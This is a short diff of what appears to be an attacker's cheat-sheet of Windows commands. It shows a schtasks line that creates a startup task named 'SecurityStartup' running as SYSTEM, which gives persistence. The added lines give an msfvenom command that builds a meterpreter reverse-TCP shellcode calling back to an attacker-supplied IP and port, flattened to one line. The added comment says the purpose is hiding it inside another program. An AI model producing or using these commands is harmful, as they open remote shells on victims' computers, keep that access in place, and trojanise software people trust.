@@ -48,5 +48,6 @@ create scheduled task with cmd
     
     schtasks /create /tn "SecurityStartup" /tr "C:\pathtoprogram.exe" /sc ONSTART /ru SYSTEM /rl HIGHEST /f
 
+create a meterpreter shellcode for single line good for hide in the another program
 
     msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f c | tr -d '\n' | sed 's/ //g'
